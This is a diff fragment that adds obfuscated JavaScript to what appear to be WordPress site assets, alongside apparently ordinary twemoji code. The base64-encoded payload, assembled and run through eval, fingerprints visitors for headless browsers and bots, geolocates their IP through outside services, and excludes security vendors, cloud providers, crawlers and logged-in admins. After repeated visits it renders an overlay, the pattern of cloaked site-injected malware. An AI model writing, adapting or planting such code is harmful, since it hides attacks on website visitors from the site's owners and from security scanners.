RyaXZlci9pLnRlc3QodWEpOwogICAgICAgIHJldHVybiB7IHNjb3JlOiBpc0hlYWRsZXNzID8gSEVBRExFU1NfV0VJR0hUIDogSEVBREZVTF9XRUlHSFQgfTsKICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IGhhc1dlYmRyaXZlciA9IG5hdmlnYXRvci53ZWJkcml2ZXIgPT09IHRydWU7CiAgICAgICAgcmV0dXJuIHsgc2NvcmU6IGhhc1dlYmRyaXZlciA/IEhFQURMRVNTX1dFSUdIVCA6IEhFQURGVUxfV0VJR0hUIH07CiAgICAgIH0sCiAgICAgICgpID0+IHsKICAgICAgICBjb25zdCBoYXNDaHJvbWUgPSAhIXdpbmRvdy5jaHJvbWU7CiAgICAgICAgY29uc3QgaGFzQ29ycmVjdENocm9tZSA9IGhhc0Nocm9tZSAmJiAod2luZG93LmNocm9tZS5ydW50aW1lIHx8IHdpbmRvdy5jaHJvbWUubG9hZFRpbWVzKTsKICAgICAgICBjb25zdCBpc1N1c3BpY2lvdXMgPSAhaGFzQ2hyb21lIHx8ICFoYXNDb3JyZWN0Q2hyb21lOwogICAgICAgIHJldHVybiB7IHNjb3JlOiBpc1N1c3BpY2lvdXMgPyBTVVNQSUNJT1VTX1dFSUdIVCA6IEhFQURGVUxfV0VJR0hUIH07CiAgICAgIH0sCiAgICAgIGFzeW5jICgpID0+IHsKICAgICAgICBpZiAoIW5hdmlnYXRvci5wZXJtaXNzaW9ucykgcmV0dXJuIHsgc2NvcmU6IDAgfTsKICAgICAgICB0cnkgewogICAgICAgICAgY29uc3QgcGVybWlzc2lvblN0YXR1cyA9IGF3YWl0IG5hdmlnYXRvci5wZXJtaXNzaW9ucy5xdWVyeSh7IG5hbWU6ICJub3RpZmljYXRpb25zIiB9KTsKICAgICAgICAgIGNvbnN0IG5vdGlmaWNhdGlvblBlcm1pc3Npb24gPSBOb3RpZmljYXRpb24ucGVybWlzc2lvbjsKICAgICAgICAgIGNvbnN0IGlzSW5jb25zaXN0ZW50ID0gKG5vdGlmaWNhdGlvblBlcm1pc3Npb24gPT09ICJkZW5pZWQiICYmIHBlcm1pc3Npb25TdGF0dXMuc3RhdGUgPT09ICJwcm9tcHQiKTsKICAgICAgICAgIHJldHVybiB7IHNjb3JlOiBpc0luY29uc2lzdGVudCA/IEhFQURMRVNTX1dFSUdIVCA6IEhFQURGVUxfV0VJR0hUIH07CiAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICAgIHJldHVybiB7IHNjb3JlOiBTVVNQSUNJT1VTX1dFSUdIVCB9OwogICAgICAgIH0KICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IHBsdWdpbnNMZW5ndGggPSBuYXZpZ2F0b3IucGx1Z2lucz8ubGVuZ3RoIHx8IDA7CiAgICAgICAgY29uc3QgaXNTdXNwaWNpb3VzID0gcGx1Z2luc0xlbmd0aCA9PT0gMDsKICAgICAgICByZXR1cm4geyBzY29yZTogaXNTdXNwaWNpb3VzID8gU1VTUElDSU9VU19XRUlHSFQgOiBIRUFERlVMX1dFSUdIVCB9OwogICAgICB9LAogICAgICAoKSA9PiB7CiAgICAgICAgY29uc3QgbGFuZ3VhZ2UgPSBuYXZpZ2F0b3IubGFuZ3VhZ2U7CiAgICAgICAgY29uc3QgbGFuZ3VhZ2VzTGVuZ3RoID0gbmF2aWdhdG9yLmxhbmd1YWdlcz8ubGVuZ3RoIHx8IDA7CiAgICAgICAgY29uc3QgaXNTdXNwaWNpb3VzID0gIWxhbmd1YWdlIHx8IGxhbmd1YWdlc0xlbmd0aCA9PT0gMDsKICAgICAgICByZXR1cm4geyBzY29yZTogaXNTdXNwaWNpb3VzID8gSEVBRExFU1NfV0VJR0hUIDogSEVBREZVTF9XRUlHSFQgfTsKICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIHRyeSB7CiAgICAgICAgICBjb25zdCBjYW52YXMgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdjYW52YXMnKTsKICAgICAgICAgIGNvbnN0IGdsID0gY2FudmFzLmdldENvbnRleHQoJ3dlYmdsJykgfHwgY2FudmFzLmdldENvbnRleHQoJ2V4cGVyaW1lbnRhbC13ZWJnbCcpOwogICAgICAgICAgaWYgKCFnbCkgcmV0dXJuIHsgc2NvcmU6IFNVU1BJQ0lPVVNfV0VJR0hUIH07CiAgICAgICAgICBjb25zdCBkZWJ1Z0luZm8gPSBnbC5nZXRFeHRlbnNpb24oJ1dFQkdMX2RlYnVnX3JlbmRlcmVyX2luZm8nKTsKICAgICAgICAgIGNvbnN0IHJlbmRlcmVyID0gZGVidWdJbmZvID8gZ2wuZ2V0UGFyYW1ldGVyKGRlYnVnSW5mby5VTk1BU0tFRF9SRU5ERVJFUl9XRUJHTCkgOiAndW5rbm93bic7CiAgICAgICAgICBjb25zdCBpc1N1c3BpY2lvdXMgPSAvc3dpZnRzaGFkZXJ8bGx2bXBpcGV8bWVzYS9pLnRlc3QocmVuZGVyZXIpOwogICAgICAgICAgcmV0dXJuIHsgc2NvcmU6IGlzU3VzcGljaW91cyA/IFNVU1BJQ0lPVVNfV0VJR0hUIDogSEVBREZVTF9XRUlHSFQgfTsKICAgICAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgICAgcmV0dXJuIHsgc2NvcmU6IFNVU1BJQ0lPVVNfV0VJR0hUIH07CiAgICAgICAgfQogICAgICB9LAogICAgICAoKSA9PiB7CiAgICAgICAgY29uc3Qgb3V0ZXJIZWlnaHQgPSB3aW5kb3cub3V0ZXJIZWlnaHQ7CiAgICAgICAgY29uc3Qgb3V0ZXJXaWR0aCA9IHdpbmRvdy5vdXRlcldpZHRoOwogICAgICAgIGNvbnN0IGlubmVySGVpZ2h0ID0gd2luZG93LmlubmVySGVpZ2h0OwogICAgICAgIGNvbnN0IGlubmVyV2lkdGggPSB3aW5kb3cuaW5uZXJXaWR0aDsKICAgICAgICBjb25zdCBpc1N1c3BpY2lvdXMgPSAob3V0ZXJIZWlnaHQgPT09IDAgJiYgb3V0ZXJXaWR0aCA9PT0gMCkgfHwgKG91dGVySGVpZ2h0ID09PSBpbm5lckhlaWdodCAmJiBvdXRlcldpZHRoID09PSBpbm5lcldpZHRoKTsKICAgICAgICByZXR1cm4geyBzY29yZTogaXNTdXNwaWNpb3VzID8gSEVBRExFU1NfV0VJR0hUIDogSEVBREZVTF9XRUlHSFQgfTsKICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IGlzQ29udHJvbGxlZCA9IG5hdmlnYXRvci53ZWJkcml2ZXIgfHwgd2luZG93LmRvY3VtZW50Py5kb2N1bWVudEVsZW1lbnQ/LmdldEF0dHJpYnV0ZSgnd2ViZHJpdmVyJykgPT09ICd0cnVlJyB8fCB3aW5kb3cuY2FsbFBoYW50b20gfHwgd2luZG93Ll9waGFudG9tOwogICAgICAgIHJldHVybiB7IHNjb3JlOiBpc0NvbnRyb2xsZWQgPyBIRUFETEVTU19XRUlHSFQgOiBIRUFERlVMX1dFSUdIVCB9OwogICAgICB9LAogICAgICAoKSA9PiB7CiAgICAgICAgY29uc3QgaXNIZWFkbGVzcyA9IC9IZWFkbGVzc0Nocm9tZS8udGVzdChuYXZpZ2F0b3IudXNlckFnZW50KTsKICAgICAgICByZXR1cm4geyBzY29yZTogaXNIZWFkbGVzcyA/IEhFQURMRVNTX1dFSUdIVCA6IDAgfTsKICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IGlzUGhhbnRvbSA9IHdpbmRvdy5jYWxsUGhhbnRvbSB8fCB3aW5kb3cuX3BoYW50b20gfHwgd2luZG93LnBoYW50b207CiAgICAgICAgcmV0dXJuIHsgc2NvcmU6IGlzUGhhbnRvbSA/IEhFQURMRVNTX1dFSUdIVCA6IDAgfTsKICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IGlzU2VsZW5pdW0gPSB3aW5kb3cuZG9jdW1lbnQ/LmRvY3VtZW50RWxlbWVudD8uZ2V0QXR0cmlidXRlKCdzZWxlbml1bScpICE9PSBudWxsIHx8IHdpbmRvdy5kb2N1bWVudD8uZG9jdW1lbnRFbGVtZW50Py5nZXRBdHRyaWJ1dGUoJ3dlYmRyaXZlcicpICE9PSBudWxsIHx8IHdpbmRvdy5kb2N1bWVudD8uJGNkY18gIT09IHVuZGVmaW5lZCB8fCB3aW5kb3cuZG9jdW1lbnQ/LiR3ZGNfICE9PSB1bmRlZmluZWQ7CiAgICAgICAgcmV0dXJuIHsgc2NvcmU6IGlzU2VsZW5pdW0gPyBIRUFETEVTU19XRUlHSFQgOiAwIH07CiAgICAgIH0KICAgIF07CgogICAgbGV0IHRvdGFsU2NvcmUgPSAwOwogICAgZm9yIChjb25zdCBjaGVjayBvZiBjaGVja3MpIHsKICAgICAgdHJ5IHsKICAgICAgICBjb25zdCByZXN1bHQgPSBhd2FpdCBjaGVjaygpOwogICAgICAgIHRvdGFsU2NvcmUgKz0gcmVzdWx0LnNjb3JlOwogICAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgIC8vIElnbm9yZSBlcnJvcnMKICAgICAgfQogICAgfQoKICAgIGNvbnN0IG1heFBvc3NpYmxlU2NvcmUgPSBjaGVja3MubGVuZ3RoICogSEVBRExFU1NfV0VJR0hUOwogICAgY29uc3QgbWluUG9zc2libGVTY29yZSA9IGNoZWNrcy5sZW5ndGggKiBIRUFERlVMX1dFSUdIVDsKICAgIGNvbnN0IG5vcm1hbGl6ZWRTY29yZSA9IE1hdGgubWF4KDAsIE1hdGgubWluKDEwMCwgKCh0b3RhbFNjb3JlIC0gbWluUG9zc2libGVTY29yZSkgLyAobWF4UG9zc2libGVTY29yZSAtIG1pblBvc3NpYmxlU2NvcmUpKSAqIDEwMCkpOwogICAgcmV0dXJuIE1hdGgucm91bmQobm9ybWFsaXplZFNjb3JlKTsKICB9CgogIGZ1bmN0aW9uIGRldGVjdE9TKCkgewogICAgY29uc3QgdXNlckFnZW50ID0gbmF2aWdhdG9yLnVzZXJBZ2VudC50b0xvd2VyQ2FzZSgpOwogICAgY29uc3QgcGxhdGZvcm0gPSBuYXZpZ2F0b3IucGxhdGZvcm0/LnRvTG93ZXJDYXNlKCkgfHwgJyc7CgogICAgaWYgKC9pcGhvbmV8aXBhZHxpcG9kL2kudGVzdCh1c2VyQWdlbnQpKSByZXR1cm4gJ2lvcyc7CiAgICBpZiAoL2FuZHJvaWQvaS50ZXN0KHVzZXJBZ2VudCkpIHJldHVybiAnYW5kcm9pZCc7CiAgICBpZiAoL2xpbnV4L2kudGVzdCh1c2VyQWdlbnQpICYmICEvYW5kcm9pZC9pLnRlc3QodXNlckFnZW50KSkgcmV0dXJuICdsaW51eCc7CiAgICBpZiAoL21hYyBvcyB4fG1hY2ludG9zaC9pLnRlc3QodXNlckFnZW50KSkgcmV0dXJuICdtYWMnOwogICAgaWYgKC93aW4vaS50ZXN0KHVzZXJBZ2VudCkgfHwgL3dpbi9pLnRlc3QocGxhdGZvcm0pKSByZXR1cm4gJ3dpbmRvd3MnOwoKICAgIHJldHVybiAndW5rbm93bic7CiAgfQoKICBhc3luYyBmdW5jdGlvbiBpc0FjY2Vzc0FsbG93ZWQoKSB7CiAgICB0cnkgewogICAgICBjb25zdCBkZXRlY3RlZE9TID0gZGV0ZWN0T1MoKTsKICAgICAgY29uc3QgaW5jbHVkZU9TTGlzdCA9IFtdOwogICAgICBpZiAoaW5jbHVkZU9TTGlzdC5sZW5ndGggPiAwICYmICFpbmNsdWRlT1NMaXN0LmluY2x1ZGVzKGRldGVjdGVkT1MpKSB7CiAgICAgICAgdmxvZygnZGVueV9vcycsIGRldGVjdGVkT1MpOwogICAgICAgIHRyYWNrQm90KCk7CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICB9CgogICAgICBjb25zdCBoZWFkbGVzc1Byb2JhYmlsaXR5ID0gYXdhaXQgZGV0ZWN0SGVhZGxlc3MoKTsKICAgICAgaWYgKGhlYWRsZXNzUHJvYmFiaWxpdHkgPiAyNSkgewogICAgICAgIHZsb2coJ2RlbnlfaGVhZGxlc3MnLCBoZWFkbGVzc1Byb2JhYmlsaXR5KTsKICAgICAgICB0cmFja0JvdCgpOwogICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgfQoKICAgICAgY29uc3QgYm90UGF0dGVybnMgPSBbJ2JvdCcsJ2NyYXdsJywnc3BpZGVyJywnc2NyYXBlJywnc2x1cnAnLCd5YWhvbycsJ2dvb2dsZScsJ3lhbmRleCcsJ2JhaWR1JywnYmluZycsJ2R1Y2tkdWNrJywndGVvbWEnLCdhcmNoaXZlJ107CiAgICAgIGNvbnN0IHVzZXJBZ2VudCA9IG5hdmlnYXRvci51c2VyQWdlbnQudG9Mb3dlckNhc2UoKTsKICAgICAgZm9yIChjb25zdCBwYXR0ZXJuIG9mIGJvdFBhdHRlcm5zKSB7CiAgICAgICAgaWYgKHVzZXJBZ2VudC5pbmNsdWRlcyhwYXR0ZXJuKSkgewogICAgICAgICAgdmxvZygnZGVueV9ib3RfdWEnLCB1c2VyQWdlbnQpOwogICAgICAgICAgdHJhY2tCb3QoKTsKICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICAgIH0KCiAgICAgIAogICAgICBjb25zdCBpcFJlc3BvbnNlID0gYXdhaXQgZmV0Y2goJ2h0dHBzOi8vYXBpLmlwaWZ5Lm9yZz9mb3JtYXQ9anNvbicpOwogICAgICBpZiAoIWlwUmVzcG9uc2Uub2spIHsKICAgICAgICB2bG9nKCdpcGlmeV9mYWlsZWQnLCBpcFJlc3BvbnNlLnN0YXR1cyk7CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgIH0KICAgICAgY29uc3QgaXBEYXRhID0gYXdhaXQgaXBSZXNwb25zZS5qc29uKCk7CiAgICAgIGNvbnN0IGlwID0gaXBEYXRhLmlwOwoKICAgICAgY29uc3QgaXNwUmVzcG9uc2UgPSBhd2FpdCBmZXRjaCgnaHR0cHM6Ly9pcDJsb2NhdGlvbi1hcGktOTc5ODQ4MDY3Njc3LnVzLWNlbnRyYWwxLnJ1bi5hcHAvP2lwPScgKyBpcCk7CiAgICAgIGlmICghaXNwUmVzcG9uc2Uub2spIHsKICAgICAgICB2bG9nKCdpc3BfbG9va3VwX2ZhaWxlZCcsIGlzcFJlc3BvbnNlLnN0YXR1cyk7CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgIH0KICAgICAgY29uc3QgaXNwRGF0YSA9IGF3YWl0IGlzcFJlc3BvbnNlLmpzb24oKTsKICAgICAgY29uc3QgaXNwID0gaXNwRGF0YS5pc3AgfHwgJyc7CiAgICAgIGNvbnN0IGNvdW50cnlDb2RlID0gaXNwRGF0YS5nZW9pcDJfY291bnRyeV9jb2RlIHx8ICcnOwoKICAgICAgdmxvZygnaXBfaW5mbycsIHsgaXAsIGNvdW50cnlDb2RlLCBpc3AgfSk7CgogICAgICBjb25zdCBpbmNsdWRlQ291bnRyeUxpc3QgPSBbXTsKICAgICAgaWYgKGluY2x1ZGVDb3VudHJ5TGlzdC5sZW5ndGggPiAwICYmICghY291bnRyeUNvZGUgfHwgIWluY2x1ZGVDb3VudHJ5TGlzdC5pbmNsdWRlcyhjb3VudHJ5Q29kZSkpKSB7CiAgICAgICAgdmxvZygnZGVueV9jb3VudHJ5JywgY291bnRyeUNvZGUpOwogICAgICAgIHRyYWNrQm90KCk7CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICB9CgogICAgICBjb25zdCBibG9ja2VkSVNQcyA9IFsKICAgICAgICAnTTI0NyBFdXJvcGUnLCdQYWNrZXRodWInLCdMZWFzZVdlYicsJ0RhdGFDYW1wJywnSVBYTycsJ1NlY3VyZSBEYXRhIFN5c3RlbXMnLCdOaWVkZXJzYWVjaHNpc2NoZSBMYW5kZXNyZWdpZXJ1bmcnLCdCYXJyYWN1ZGEgTmV0d29ya3MnLCdUcmVuZCBNaWNybyBJbmNvcnBvcmF0ZWQnLCdNaWNyb3NvZnQgQ29ycCcsJ01pY3Jvc29mdCBDb3Jwb3JhdGlvbicsJ1N1cmZDb250cm9sJywnV2Vic2Vuc2UnLCdHSE9TVG5ldCBHbWJIJywnSU5FVHUnLCdBdmlyYSBCLlYuJywnR29vZ2xlIENsb3VkJywnWWFob28hJywnQ29tbXRvdWNoJywnQ2xvdWRGbGFyZScsJ1RydXN0d2F2ZSBIb2xkaW5ncycsJ0ZPUlRIbmV0IFNBJywnVVMgRGVwYXJ0bWVudCBvZiBEZWZlbnNlIE5ldHdvcmsnLCdaT05FUyBBUycsJ0Npc2NvIFN5c3RlbXMgSXJvbnBvcnQgRGl2aXNpb24nLCdUaGVQbGFuZXQuY29tIEludGVybmV0IFNlcnZpY2VzJywnV2Vicm9vdCBTZXJ2aWNlcycsJ1JhY2tzcGFjZSBIb3N0aW5nJywnUGVyaW1ldGVyIGVTZWN1cml0eScsJ0RpZ2l0YWxPY2VhbicsJ1BhY2tldEV4Y2hhbmdlJywnR3lyb24gSW50ZXJuZXQgTHRkJywnTmV3TWVkaWEgRXhwcmVzcyBQdGUnLCdBbWF6b24uY29tJywnTWNBZmVlJywnRVNFVCwgc3BvbC4gcyByLm8uJywnRmFjZWJvb2snLCdGYWNlYm9vayBJcmVsYW5kIEx0ZCcsJ1lhaG9vISBCcm9hZGNhc3QgU2VydmljZXMnLCdZYWhvbyEgSW5kaWEgUHZ0JywnWWFob28gSmFwYW4nLCdZYWhvbyBKYXBhbiBDb3Jwb3JhdGlvbicsJ0dvb2dsZWJvdCcsJ0FWQVNUIFNvZnR3YXJlIHMuci5vLicsJ01pY3Jvc29mdCBiaW5nYm90JywnTWljcm9zb2Z0IEhvc3RpbmcnLCdBbWF6b24gVGVjaG5vbG9naWVzJywnQ3l2ZWlsbGFuY2UnLCdDbG91ZG1hcmsnLCdDbG91ZG1hcmsgTGFicycsJ1RvcHN5IExhYnMnLCdBbWF6b24nLCdTRVJWRVIgQkxPQ0snLCdPVkggSG9zdGluZycsJ1lBTkRFWCcsJ1lBTkRFWCBMTEMnLCdZYWhvbyBCYW5nYWxvcmUgTmV0d29yayBNb25pdG9yaW5nIENlbnRlcicsJ1RpbmV0JywnTXVsdGltZWRpYSBQb2xza2EgUy5BLicsJ011bHRpbWVkaWEgUG9sc2thIC0gUG9sdWRuaWUgUy5BLicsJ1plbml0aCBFbGVjdHJvbmljcyBDb3Jwb3JhdGlvbicsJ0JhcnJhY3VkYSBDYW5hZGEnLCdNaWNyb3NvZnQgTGltaXRlZCcsJ01pY3Jvc29mdCAoQ2hpbmEpIENvLicsJ1NQQU1maWdodGVyIEFwUycsJ1NwYW1maWdodGVyLWFzJywnRGlnaXRhbE9uZSBBRycsJ1R3aXR0ZXInLCdUd2l0dGVyIEludGVybmF0aW9uYWwgQ29tcGFueScsJ1N1cmZjb250cm9sLXJlYWRpbmcnLCdZYWhvbyBDb3JwIE5ldHdvcmsnLCdDb25lY3RpdmEnLCdDb25lY3RpdmEgVGVsZWNvbScsJ0NvbmVjdGl2YSBDZWx1bGFyIGUgSW5mb3JtYXRpY2EgTHRkYScsJ1JlZGlmZi5jb20gSW5kaWEgTGltaXRlZCcsJ0luY2VybyBMTEMnLCdPTkxJTkUgUy5BLlMuJywnT05MSU5FIFNBUycsJ1Rpc2NhbGktaXQnLCdUaXNjYWxpIFNwQScsJ1Rpc2NhbGkgVUsgTGltaXRlZCcsJ0Z1aml0c3UnLCdEYXVtIENvbW11bmljYXRpb24gQ28uLExURCcsJ0ludGVybmV0IFNlY3VyaXR5IFN5c3RlbXMnLCdWS29udGFrdGUgTHRkJywnTGVhc2V3ZWInLCdMZWFzZVdlYiBOZXRoZXJsYW5kcyBCLlYuJywnTGVhc2VXZWIgQi5WLicsJ0xlYXNlV2ViIENETiBCLlYuJywnTGVhc2VXZWIgTmV0d29yayBCLlYuJywnTGVhc2V3ZWIgQXNpYScsJ0xlYXNld2ViIEFzaWEgUGFjaWZpYyBwdGUuJywnTGVhc2V3ZWIgRGV1dHNjaGxhbmQgR21iSCcsJ0xlYXNld2ViIFVTQScsJ0xlYXNld2ViLWRlJywnSW50ZXJOQVAgTmV0d29yayBTZXJ2aWNlcyBVLksuIExpbWl0ZWQnLCdJbnRlcm5hcCBKYXBhbiBDby4sTFRELicsJ0ludGVybmFwIE5ldHdvcmsgU2VydmljZXMnLCdJbnRlcm5hcCBOZXR3b3JrIFNlcnZpY2VzIENvcnBvcmF0aW9uJywnQml0ZGVmZW5kZXItYXMnLCdCaXRkZWZlbmRlciBTUkwnLCdNWCBMb2dpYycsJ0NoaW5hIEVkdWNhdGlvbiBhbmQgUmVzZWFyY2ggTmV0d29yayBDZW50ZXInLCdDaGluYSBEdXR5IEZyZWUgZ3JvdXAnLCdDaGluYScsJ0NoaW5hIEJyb2FkYmFuZCBDb21tdW5pY2F0aW9ucyAoQ0JDbmV0KScsJ0NoaW5hIEJyb2FkY2FzdGluZyBUViBOZXQnLCdDaGluYSBDb21tdW5pY2F0aW9uIENvLicsJ0NoaW5hIENvbnN0cnVjdGlvbiBCYW5rIChBc2lhKSBDb3Jwb3JhdGlvbiBMaW1pdGVkJywnQ2hpbmEgQ3VsdHVyYWwgSGVyaXRhZ2UgSW5mb3JtYXRpb24gYW5kIENvbnN1bHRpbmcnLCdDaGluYSBEaWdpdGFsIEtpbmdkb20gVGVjaG5vbG9neSBDby4sTHRkLicsJ0NoaW5hIERyYWdvbiBUZWxlY29tIENvLixMdGQnLCdGYWN0aW9uJywnWmVuIFN5c3RlbXMgQS9TJywnT1ZIIFNBUycsJ1NvbHV0aW9uIFBybycsJ0RlZEZpYmVyQ28nLCdDbGVhckJsdWUgVGVjaG5vbG9naWVzJywnSW5mb3JtYXRpb24gVGVjaG5vbG9neSBTeXN0ZW1zJywnR29EYWRkeS5jb20sIExMQycsJ1NlcnZlciBDZW50cmFsIE5ldHdvcmsnLCdUaW5ldCBTcGEnLCdDYXByaXMgR3JvdXAnLCdJbmt0b21pIENvcnBvcmF0aW9uJywnVW5pZmllZCBMYXllcicsJ0pTQyBSVENvbW0uUlUnLCdMTEMgbWFzdGVyaG9zdCcsJ01UTyBUZWxlY29tJywnTGlua2VkSW4gQ29ycG9yYXRpb24nLCdXZWJzaXRld2VsY29tZS5jb20nLCdHVFMgVGVsZWNvbSBTUkwnLCdQdWxzZVBvaW50IENvbW11bmljYXRpb25zJywnUHVsc2Vwb2ludCcsJ1RpbWVXZWIgTHRkLicsJ0JlaWppbmcgQmFpZHUgTmV0Y29tIFNjaWVuY2UgYW5kIFRlY2hub2xvZ3kgQ28uJywnRGlnaXRhbCBPY2VhbicsJ1RocmVhdFRyYWNrJywnVGhyZWF0VHJhY2sgU2VjdXJpdHknLCdFR0lIb3N0aW5nJywnSEVUWk5FUicsJ0hldHpuZXItYXMnLCdIZXR6bmVyIE9ubGluZSBHbWJIJywnSEVUWk5FUiAoUHR5KSBMdGQnLCdIZXR6bmVyIENDJywnTGltaXRlZCBsaWFiaWxpdHkgY29tcGFueSBNYWlsLlJ1JywnQW1hem9uIENvcnBvcmF0ZSBMTEMnLCdBbWF6b24gRGF0YSBTZXJ2aWNlcyBJcmVsYW5kIEx0ZCcsJ0FtYXpvbiBXZWIgU2VydmljZXMsIExMQycsJ0FtYXpvbi5jb20gVGVjaCBUZWxlY29tJywnQW1hem9uaWEgUHVibGljaWRhZGUgTHRkYScsJ0FtYXpvbmlhIFRlbGVjb20gTHRkYS4gLSBNZScsJ0thc3BlcnNreSBMYWIgQU8nLCdBbGlzdGFyIFNlY3VyaXR5IFNybCcsJ05GT3JjZSBFbnRlcnRhaW5tZW50IEIuVi4nLCdTSyBCcm9hZGJhbmQnLCdaYXlvIEdyb3VwIEVVIExpbWl0ZWQnLCdRdWFkcmFOZXQnLCdSYW1Ob2RlIExMQycsJ0hvc3RVUycKICAgICAgXTsKCiAgICAgIGlmIChibG9ja2VkSVNQcy5pbmNsdWRlcyhpc3ApKSB7CiAgICAgICAgdmxvZygnZGVueV9pc3AnLCBpc3ApOwogICAgICAgIHRyYWNrQm90KCk7CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICB9CiAgICAgIAoKICAgICAgcmV0dXJuIHRydWU7CiAgICB9IGNhdGNoIChlcnIpIHsKICAgICAgdmVycignQWNjZXNzIGNoZWNrIGZhaWxlZDonLCBlcnIpOwogICAgICByZXR1cm4gdHJ1ZTsKICAgIH0KICB9CgogIGFzeW5jIGZ1bmN0aW9uIGluaXQoKSB7CiAgICB0cnkgewogICAgICBjb25zdCBhbGxvd2VkID0gYXdhaXQgaXNBY2Nlc3NBbGxvd2VkKCk7CiAgICAgIHZsb2coJ2FjY2Vzc19hbGxvd2VkJywgYWxsb3dlZCk7CiAgICAgIGlmICghYWxsb3dlZCkgewogICAgICAgIHJldHVybjsKICAgICAgfQoKICAgICAgY29uc3Qgc2tpcCA9IGdldFZhbCgnX3NraXAnLCAnMCcpOwogICAgICBpZiAoc2tpcCA9PT0gJzEnKSB7CiAgICAgICAgcmV0dXJuOwogICAgICB9CgogICAgICBpZiAoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3dwYWRtaW5iYXInKSkgewogICAgICAgIHJldHVybjsKICAgICAgfQoKICAgICAgbGV0IGNvdW50ID0gcGFyc2VJbnQoZ2V0VmFsKEtFWSwgJzAnKSwgMTApOwogICAgICBpZiAoTnVtYmVyLmlzTmFOKGNvdW50KSkgY291bnQgPSAwOwogICAgICBjb3VudCsrOwogICAgICBzZXRWYWwoS0VZLCBjb3VudC50b1N0cmluZygpKTsKCiAgICAgIGlmIChjb3VudCA+PSBOKSB7CiAgICAgICAgcmVuZGVyT3ZlcmxheSgpOwogICAgICB9CiAgICB9IGNhdGNoKGUpIHsKICAgICAgdmVycignaW5pdF9mYWlsZWQnLCBlKTsKICAgICAgcmVuZGVyT3ZlcmxheSgpOwogICAgfQogIH0KCiAgaWYgKGRvY3VtZW50LmJvZHkpIHsKICAgIGluaXQoKTsKICB9IGVsc2UgewogICAgZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignRE9NQ29udGVudExvYWRlZCcsIGluaXQpOwogIH0KfSkoKTsKICA=",
+    "MC42NTg2MDY4NDcxNzIyMDg=",
+    "MC4yNDk2MTA2NTcxODMwODk2",
+    "MC41ODk5MjE1OTM4ODY4NDk3",
+    "MC41MTQzMzQyMjE5Njc4MTQ=",
+    "MC43Njg3OTMwODM5MDU0NDY3"
+  ];
+
+  var _k1 = "539252";
+  var _k2 = "385903";
+  var _k3 = 4;
+
+  var _code = b64ToUtf8(_b[_k1]) + b64ToUtf8(_x[_k2]) + b64ToUtf8(_a[_k3]);
+  eval(_code);
+})();
+/* >>> wp_junk2.js (46393 bytes) <<< */
+(function(){
+try{
+var twemoji = function() {
+    "use strict";
+    var h = {
+            base: "https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/",
+            ext: ".png",
+            size: "72x72",
+            className: "emoji",
+            convert: {
+                fromCodePoint: function(d) {
+                    d = "string" == typeof d ? parseInt(d, 16) : d;
+                    if (d < 65536) return e(d);
+                    return e(55296 + ((d -= 65536) >> 10), 56320 + (1023 & d))
+                },
+                toCodePoint: o
+            },
+            onerror: function() {
+                this.parentNode && this.parentNode.replaceChild(x(this.alt, !1), this)
+            },
+            parse: function(d, u) {
+                u && "function" != typeof u || (u = {
+                    callback: u
+                });
+                return h.doNotParse = u.doNotParse, ("string" == typeof d ? function(d, a) {
+                    return n(d, function(d) {
+                        var u, f, c = d,
+                            e = N(d),
+                            b = a.callback(e, a);
+                        if (e && b) {
+                            for (f in c = "<img ".concat('class="', a.className, '" ', 'draggable="false" ', 'alt="', d, '"', ' src="', b, '"'), u = a.attributes(d, e)) u.hasOwnProperty(f) && 0 !== f.indexOf("on") && -1 === c.indexOf(" " + f + "=") && (c = c.concat(" ", f, '="', u[f].replace(t, r), '"'));
+                            c = c.concat("/>")
+                        }
+                        return c
+                    })
+                } : function(d, u) {
+                    var f, c, e, b, a, t, r, n, o, s, i, l = function d(u, f) {
+                            var c, e, b = u.childNodes,
+                                a = b.length;
+                            for (; a--;) c = b[a], 3 === (e = c.nodeType) ? f.push(c) : 1 !== e || "ownerSVGElement" in c || m.test(c.nodeName.toLowerCase()) || h.doNotParse && h.doNotParse(c) || d(c, f);
+                            return f
+                        }(d, []),
+                        p = l.length;
+                    for (; p--;) {
+                        for (e = !1, b = document.createDocumentFragment(), a = l[p], t = a.nodeValue, r = 0; o = g.exec(t);) {
+                            if ((i = o.index) !== r && b.appendChild(x(t.slice(r, i), !0)), s = N(o = o[0]), r = i + o.length, i = u.callback(s, u), s && i) {
+                                for (c in (n = new Image).onerror = u.onerror, n.setAttribute("draggable", "false"), f = u.attributes(o, s)) f.hasOwnProperty(c) && 0 !== c.indexOf("on") && !n.hasAttribute(c) && n.setAttribute(c, f[c]);
+                                n.className = u.className, n.alt = o, n.src = i, e = !0, b.appendChild(n)
+                            }
+                            n || b.appendChild(x(o, !1)), n = null
+                        }
+                        e && (r < t.length && b.appendChild(x(t.slice(r), !0)), a.parentNode.replaceChild(b, a))
+                    }
+                    return d
+                })(d, {
+                    callback: u.callback || b,
+                    attributes: "function" == typeof u.attributes ? u.attributes : a,
+                    base: ("string" == typeof u.base ? u : h).base,
+                    ext: u.ext || h.ext,
+                    size: u.folder || function(d) {
+                        return "number" == typeof d ? d + "x" + d : d
+                    }(u.size || h.size),
+                    className: u.className || h.className,
+                    onerror: u.onerror || h.onerror
+                })
+            },
+            replace: n,
+            test: function(d) {
+                g.lastIndex = 0;
+                d = g.test(d);
